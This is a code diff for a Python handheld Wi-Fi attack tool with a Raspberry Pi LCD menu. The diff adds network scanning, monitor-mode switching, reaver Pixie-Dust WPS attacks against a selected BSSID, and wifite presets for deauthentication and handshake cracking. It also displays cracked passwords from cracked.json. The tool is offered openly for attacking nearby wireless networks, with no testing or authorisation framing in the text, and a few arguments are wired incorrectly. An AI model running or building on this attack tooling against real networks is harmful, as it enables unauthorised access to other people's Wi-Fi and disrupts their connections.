@@ -7,13 +7,17 @@ import subprocess
 import threading
 from PIL import Image, ImageDraw, ImageFont
 
+os.environ["GPG_TTY"] = "/dev/tty1"
+#os.system("export GPG_TTY=$(tty)")
 
 ESSIDS = []  # List to store scanned ESSIDs
 selected_essid = None  # Variable to store selected ESSID
+selected_bssid = None
 scanning = False  # State variable to track if scanning is active
 
 OPTIONS_PER_PAGE = 10
 DEBOUNCE_TIME = 0.15
+current_index = 0
 
 KEY_UP_PIN = 6
 KEY_DOWN_PIN = 19
@@ -33,38 +37,57 @@ image = Image.new('RGB', (width, height), color=(0, 0, 0))
 draw = ImageDraw.Draw(image)
 font = ImageFont.load_default()
 
-# Function to display the ESSID selection menu
-def essid_selection_menu():
-    global selected_essid
-    active_idx = 0
-    total_options = len(ESSIDS)
+def check_monitor_mode_and_enable(interface):
+    interface_name = interface[0] if isinstance(interface, tuple) else interface
+    
+    try:
+        # Check for interfaces in monitor mode
+        result = subprocess.run(["/usr/sbin/iwconfig"], capture_output=True, text=True)
+        monitor_mode_found = False
 
-    while True:
-        draw.rectangle((0, 0, width, height), outline=0, fill=0)  # Clear screen
-        for i, essid in enumerate(ESSIDS):
-            if i == active_idx:
-                draw.text((6, i * 10), f"> {essid}", font=font, fill=(255, 255, 0))  # Highlight active option
-            else:
-                draw.text((6, i * 10), f"  {essid}", font=font, fill=(255, 255, 255))  # Normal display
+        # Check if any interface is in monitor mode
+        for line in result.stdout.splitlines():
+            if "Mode:Monitor" in line:
+                monitor_mode_found = True
+                break
+        
+        # If no monitor mode found, start airmon-ng on the selected interface
+        if not monitor_mode_found:
+            print(f"No interfaces in monitor mode. Starting airmon-ng on {interface_name}...")
+            subprocess.run(["sudo", "/usr/sbin/airmon-ng", "start", interface_name], check=True)
+            print(f"Started monitor mode on {interface_name}.")
+        else:
+            print("An interface is already in monitor mode.")
+    
+    except subprocess.CalledProcessError as e:
+        print(f"Error during operation: {e}")
+        time.sleep(5)
+    except Exception as e:
+        print(f"An unexpected error occurred: {e}")
+        time.sleep(5)
+        
+def check_monitor_mode_and_disable(interface):
+    interface_name = interface[0] if isinstance(interface, tuple) else interface
+    
+    try:
+        # Check for interfaces in monitor mode
+        result = subprocess.run(["/usr/sbin/iwconfig"], capture_output=True, text=True)
+        monitor_mode_found = False
 
-        disp.LCD_ShowImage(image, 0, 0)
+        # Check if any interface is in monitor mode
+        for line in result.stdout.splitlines():
+            if "Mode:Monitor" in line:
+                monitor_mode_found = True
+                subprocess.run(["sudo", "ip", "link", "set", interface_name, "down"], check=True)
+                subprocess.run(["sudo", "iw", "dev", interface_name, "set", "type", "managed"], check=True)
+                subprocess.run(["sudo", "ip", "link", "set", interface_name, "up"], check=True)
 
-        if GPIO.input(KEY_UP_PIN) == GPIO.LOW:
-            active_idx = (active_idx - 1) % total_options  # Scroll up
-            debounce()
-
-        elif GPIO.input(KEY_DOWN_PIN) == GPIO.LOW:
-            active_idx = (active_idx + 1) % total_options  # Scroll down
-            debounce()
-
-        elif GPIO.input(KEY_PRESS_PIN) == GPIO.LOW:
-            selected_essid = ESSIDS[active_idx]  # Set selected ESSID
-            display_message(f"Selected: {selected_essid}")
-            time.sleep(1)
-            break
-
-    # Clear the display before returning to the menu
-    disp.LCD_Clear()
+    except subprocess.CalledProcessError as e:
+        print(f"Error during operation: {e}")
+        time.sleep(5)
+    except Exception as e:
+        print(f"An unexpected error occurred: {e}")
+        time.sleep(5)
 
 def get_wireless_interfaces():
     interfaces = []
@@ -104,9 +127,88 @@ def get_wireless_interfaces():
 
 # Initialize wireless interfaces
 wireless_interfaces = get_wireless_interfaces()
-selected_interface = wireless_interfaces[0]
+if len(wireless_interfaces) > 1:
+    selected_interface = wireless_interfaces[1]
+else:
+    selected_interface = wireless_interfaces[0]
+
+
+#Function scan for wifi
+def scan_wifi_networks():
+    global ESSIDS, current_index
+    ESSIDS.clear()  # Clear previous scan results
+
+    display_message("Scanning... Press SELECT to stop")
+    selected_interface_name = selected_interface[0] if isinstance(selected_interface, tuple) else selected_interface
+    display_message_with_wrap(f"{selected_interface}, {selected_interface_name}")
+    while GPIO.input(KEY_PRESS_PIN) != GPIO.LOW:  # Continue scanning until key is pressed
+        check_monitor_mode_and_disable(selected_interface_name)
+        result = subprocess.run(["sudo", "/usr/sbin/iwlist", selected_interface_name, "scan"], capture_output=True, text=True)
+
+        # Parse the output for ESSID and BSSID
+        lines = result.stdout.splitlines()
+        current_bssid = None  # Variable to hold the current BSSID
+        for line in lines:
+            if "Address:" in line:  # Detecting BSSID
+                current_bssid = line.split("Address:")[1].strip()  # Capture the BSSID
+            elif "ESSID" in line:  # Detecting ESSID
+                essid = line.split(":")[1].strip().strip('"')
+                if essid and current_bssid:  # Ensure both essid and bssid are present
+                    # Store as a tuple (ESSID, BSSID)
+                    if (essid, current_bssid) not in ESSIDS:  # Avoid duplicates
+                        ESSIDS.append((essid, current_bssid))
+                        display_message_with_wrap(f"{essid}", append=True)
+                        print(f"{essid}, {current_bssid}")
+
+        time.sleep(0.2)  # Add a slight delay between scans to avoid overloading the system
+
+    print("Wi-Fi scan stopped.")
+
+
+# Function to display the ESSID selection menu
+
+def essid_selection_menu():
+    global selected_essid, selected_bssid
+
+    if not ESSIDS:
+        display_message("No Wi-Fi networks to display")
+        return
+    
+    active_idx = 0
+    total_essids = len(ESSIDS)
+
+    while True:
+        draw.rectangle((0, 0, width, height), outline=0, fill=0)
+        start_idx = max(0, active_idx - OPTIONS_PER_PAGE + 1)
+        end_idx = min(total_essids, start_idx + OPTIONS_PER_PAGE)
+
+        for i in range(start_idx, end_idx):
+            essid, bssid = ESSIDS[i]  # Unpacking to get both ESSID and BSSID
+            if i == active_idx:
+                draw.text((6, (i - start_idx) * 10), f"> {essid}", font=font, fill=(255, 255, 0))  # Highlight active option
+            else:
+                draw.text((6, (i - start_idx) * 10), f"  {essid}", font=font, fill=(255, 255, 255))
+
+        disp.LCD_ShowImage(image, 0, 0)
+
+        if GPIO.input(KEY_UP_PIN) == GPIO.LOW:
+            active_idx = (active_idx - 1) % total_essids  # Scroll up
+            debounce()
+
+        elif GPIO.input(KEY_DOWN_PIN) == GPIO.LOW:
+            active_idx = (active_idx + 1) % total_essids  # Scroll down
+            debounce()
+
+        elif GPIO.input(KEY_PRESS_PIN) == GPIO.LOW:
+            selected_essid, selected_bssid = ESSIDS[active_idx]  # Store both selected values
+            display_message(f"Selected: {selected_essid}, BSSID: {selected_bssid}")
+            time.sleep(1)
+            break
+
+
 
 options = [
+    {"name": "Scan WIFI", "state": False, "command": None},
     {"name": "Scan Time", "state": "Off", "command": "", "values": ["Off"] + [str(i) for i in range(10, 101, 10)]},
     {"name": "LOOP RUN", "state": False, "command": "-inf"},
     {"name": "I", "state": selected_interface, "command": ""},
@@ -122,11 +224,12 @@ options = [
     {"name": "Clients Only", "state": False, "command": "--clients-only"},
     {"name": "No Deauths", "state": False, "command": "--nodeauths"},
     {"name": "Deauth sec", "state": "Off", "command": "", "values": ["Off"] + [str(i) for i in range(31)]},
+    {"name": "PIXIE QUICK 30", "state": False, "command": "--wps-only --pixie --wps-time 30"},
+    {"name": "PIXIE QUICK 60", "state": False, "command": "--wps-only --pixie --wps-time 60"},
+    {"name": "DEAUTH QUICK 120", "state": False, "command": "--no-pmkid --no-wps -wpat 120"},
+    {"name": "DEAUTH QUICK 240", "state": False, "command": "--no-pmkid --no-wps -wpat 240"},
     {"name": "Quit", "state": False, "command": None}
 ]
-
-
-
 
 # Debounce function to avoid repeated code
 def debounce():
@@ -222,17 +325,12 @@ def display_file_on_lcd(filename):
 
     disp.LCD_Clear()  # Clear the display before returning to the menu
 
-
-# Function to display messages on the LCD with line length check
 def display_message_with_wrap(message, append=False):
-    if not append:  # If not appending, clear the screen
-        draw.rectangle((0, 0, width, height), outline=0, fill=0)
-
-    # Remove ASCII color codes
-    message = re.sub(r'\x1B\[[0-?9;]*[mK]', '', message)  # ANSI escape code for colors
-
     # Maximum characters that fit on one line
     max_chars_per_line = width // 10  # Approximation (depends on font size)
+    
+    # Remove ASCII color codes
+    message = re.sub(r'\x1B\[[0-?9;]*[mK]', '', message)  # ANSI escape code for colors
 
     # Split message into lines
     words = message.split()
@@ -251,103 +349,142 @@ def display_message_with_wrap(message, append=False):
     if current_line:
         displayed_lines.append(current_line)
 
+    # If appending, retain the previously displayed lines
+    if append:
+        # Store existing lines from the previous message (if any)
+        existing_lines = getattr(display_message_with_wrap, 'existing_lines', [])
+        displayed_lines = existing_lines + displayed_lines
+        
+    # Limit the displayed lines to the height of the display
+    max_visible_lines = height // 10  # Assuming each line is 10 pixels high
+    displayed_lines = displayed_lines[-max_visible_lines:]  # Keep only the last few lines that fit
+
+    # Clear the display before showing new content
+    draw.rectangle((0, 0, width, height), outline=0, fill=0)
+    
     # Display the lines
     for i, line in enumerate(displayed_lines):
-        if i * 10 >= height:  # Break if we exceed the height of the display
-            break
         draw.text((10, i * 10), line.strip(), font=font, fill=(255, 255, 255))
 
     disp.LCD_ShowImage(image, 0, 0)
 
+    # Store the displayed lines for the next call
+    display_message_with_wrap.existing_lines = displayed_lines
+
 
 import re
+current_essid = ""
+current_mac = ""
+
+# Non-blocking I/O helper to read subprocess output
+def read_output_nonblocking(process, output_lines):
+    global current_essid, current_mac
+
+    for line in iter(process.stdout.readline, ''):
+        output_stripped = line.strip()
+
+        # Display raw output (debugging line, can be removed)
+        #display_message_with_wrap(f"Raw Output: {output_stripped}", append=False)
+
+        # Check for "Starting attacks against" message and update ESSID/MAC
+        
+        if "Starting attacks against" in output_stripped:
+            essid_match = re.search(r'Starting attacks against (.+?) \((.*?)\)$', output_stripped)
+            if essid_match:
+                current_essid = essid_match.group(1).strip()  # Extract ESSID
+                current_mac = essid_match.group(2).strip()  # Extract MAC address
+                display_message_with_wrap(f"Attacking: {current_mac}", append=False)
+                time.sleep(2)  # Keep the message on the screen longer
+        
+
+        # Handle output like targets and clients found
+        matches = re.findall(r'\x1b\[[0-9;]*m.*?Found.*?\x1b\[[0-9;]*m(\d+).*?target\(s\).*?\x1b\[[0-9;]*m(\d+).*?client\(s\)', output_stripped)
+        for match in matches:
+            target_count, client_count = match
+            output_lines.append(f"{target_count} targets, {client_count} clients")
+
+            # Update display with ESSID and other information
+            display_message_with_wrap(f"Attacking: {current_essid} ({current_mac})", append=False)  # Always show ESSID
+            display_message_with_wrap(output_lines[-1], append=True)  # Show the latest targets/clients found
+            time.sleep(2)  # Keep this info on the screen for 2 seconds before continuing
 
 def build_and_run_command():
-    global selected_interface  # Ensure you're using the global variable if necessary
+    global selected_interface
 
-    # Ensure selected_interface is a string
     selected_interface_name = selected_interface[0] if isinstance(selected_interface, tuple) else selected_interface
 
-    # Check if the "Show Cracked" option is selected
     if any(option["name"] == "Show Cracked" and option["state"] for option in options):
         display_message("Showing: cracked.json")
-        display_file_on_lcd("cracked.json")  # Display file content on the LCD
-    else:
-        command = ["sudo", "wifite", "-mac", "-i", selected_interface_name]  # Use the correct interface name
+        display_file_on_lcd("cracked.json")
 
-        # Append command options correctly from the options list
+    elif selected_bssid is not None and any(option["state"] for option in options if option["name"] == "PIXIE"):
+        check_monitor_mode_and_enable(selected_interface)
+        command = ["sudo", "/usr/bin/reaver", "-i", selected_interface_name, "-vv", "--pixie-dust", "-b", selected_bssid]
+
+        command_str = ' '.join(command)
+        print(f"Running: {command_str}")
+        time.sleep(1)
+        disp.LCD_Clear()
+
+        try:
+            # Execute the command
+            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+
+            # Read stdout and print output lines as they come in
+            for line in iter(process.stdout.readline, ''):
+                display_message_with_wrap(line.strip())  # Print each output line
+                print(line.strip())  # Print each output line
+
+            process.stdout.close()  # Close the stdout pipe
+            process.wait()  # Wait for the process to complete
+
+            # Handle stderr output
+            stderr_output = process.stderr.read()
+            if stderr_output:
+                print(f"Error: {stderr_output.strip()}")
+                time.sleep(2)
+
+        except Exception as e:
+            print(f"Error: {e}")
+            time.sleep(2)
+    else:
+        command = ["sudo", "/usr/sbin/wifite", "-mac", "-i", selected_interface_name]
+
         for option in options:
             if option["state"] and option.get("command"):
                 command.extend(option["command"].split())
 
-        # Display the command being run
+        if selected_essid:
+            command.append(f'-bssid "{selected_bssid}"')
+
         command_str = ' '.join(command)
         display_message_with_wrap(f"Running: {command_str}")
-
-        # Wait for 1 second before clearing the screen
         time.sleep(1)
-        disp.LCD_Clear()  # Clear the display before showing output
+        disp.LCD_Clear()
 
-        # Execute the command and handle the output
         try:
-            # Redirect stdout and stderr to avoid IO errors
+            # Execute the command
             process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
 
-            # Initialize a buffer for scrolling output
+            # Create a buffer to hold output lines
             output_lines = []
 
-            def read_output():
-                while True:
-                    output = process.stdout.readline()  # Read each line of output
-                    if output == '' and process.poll() is not None:
-                        break
-                    if output:
-                        output_stripped = output.strip()
-                        display_message_with_wrap(f"Raw Output: {output_stripped}")  # Debugging line to show raw output
-
-                        # Check for "Starting attacks against" message
-                        if "Starting attacks against" in output_stripped:
-                            essid_match = re.search(r'Starting attacks against (.+?) \((.*?)\)$', output_stripped)
-                            if essid_match:
-                                mac_address = essid_match.group(1).strip()  # Get the MAC address
-                                display_message_with_wrap(f"Attack on {mac_address}")  # Display the MAC address
-                                time.sleep(1)
-
-                        # Handle any other output or messages from Wifite
-                        matches = re.findall(r'\x1b\[[0-9;]*m.*?Found.*?\x1b\[[0-9;]*m(\d+).*?target\(s\).*?\x1b\[[0-9;]*m(\d+).*?client\(s\)', output_stripped)
-
-                        for match in matches:
-                            if match:
-                                target_count, client_count = match
-                                output_lines.append(f"{target_count} target, {client_count} client")
-
-                                # Clear the display before showing the new message
-                                disp.LCD_Clear()
-                                display_message_with_wrap(output_lines[-1])  # Display the latest match
-
-                    time.sleep(0.1)  # Control the scrolling speed
-
-            # Start a thread to read output from the process
-            output_thread = threading.Thread(target=read_output)
+            # Start a thread to read output without blocking
+            output_thread = threading.Thread(target=read_output_nonblocking, args=(process, output_lines))
             output_thread.start()
 
             process.wait()  # Wait for the process to complete
-            output_thread.join()  # Ensure output is read completely
+            output_thread.join()  # Ensure output reading completes
 
-            # Capture stderr output after the command finishes
+            # Handle stderr output
             stderr_output = process.stderr.read()
             if stderr_output:
                 stderr_output_stripped = stderr_output.strip()
-                print(stderr_output_stripped)
-                display_message_with_wrap(stderr_output_stripped)
-
+                display_message_with_wrap(f"Error: {stderr_output_stripped}")
+                time.sleep(2)
         except Exception as e:
             display_message(f"Error: {e}")
-
-
-
-
-
+            time.sleep(2)
 
 # Function to draw the current scroll window of options
 def draw_menu(active_idx):
@@ -414,9 +551,10 @@ def menu_loop():
                 time.sleep(1)
                 disp.LCD_Clear()
                 break
-            elif selected_option["name"] == "Scan for Wi-Fi":  # New option to start scanning
+            elif selected_option["name"] == "Scan WIFI":  # New option to start scanning
                 scan_wifi_networks()
-                stop_wifi_scanning()
+                display_message("please select wifi")
+                time.sleep(1)
                 essid_selection_menu()  # After scanning, enter ESSID selection
             else:
                 # Toggle option
